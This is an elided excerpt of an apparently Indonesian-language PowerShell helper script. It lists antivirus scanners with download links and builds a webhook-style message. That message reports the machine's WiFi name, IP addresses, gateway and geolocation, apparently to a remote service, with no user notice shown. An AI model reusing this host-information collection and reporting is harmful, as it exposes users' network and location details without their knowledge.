...
$antivirusList = @(
    ...
    @{ Name = "Dr.Web CureIt!"; URL = "https://free.drweb.com/download+cureit/gr"; Description = "The Dr.Web CureIt! utility will cure an infected system once, but it is not designed to provide your PC with real-time protection from viruses."; Tip = "Pastikan koneksi internet stabil untuk mendapatkan Database virus terbaru." },
    ...
    @{ Name = "F-Secure Online Scanner by Avira"; URL = "https://download.sp.f-secure.com/tools/F-SecureOnlineScanner.exe"; Description = "Online Scanner finds and removes viruses, malware and spyware on your Windows PC."; Tip = "Tetap Online saat Proses scan." },
    @{ Name = "Adlice Protect RogueKiller"; URL = "https://download.adlice.com/api?action=download&app=roguekiller&type=x64"; Description = "The next-generation virus killer. Remove unknown malware, stay protected. Free virus cleaner for everyone."; Tip = "Pilih free version" },
    ...
    $payload = @{
        ...
        embeds = @(@{
            ...
            fields = @(
                ...
                @{ name = ":globe_with_meridians: **Network**"; value = "**SSID:** $WifiName`n**LAN:**`n$LanStatus`n**Internet Status:** $InternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)`n"; inline = $false },
...
function exitScript {
    ...
    Remove-Item -Path "$env:LOCALAPPDATA\ESET\ESETOnlineScanner" -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item -Path "$env:LOCALAPPDATA\Temp\RogueKiller" -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item -Path "C:\Program Files\Trend Micro" -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    Remove-Item -Path "C:\Program Files\F-Secure Online Scanner" -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
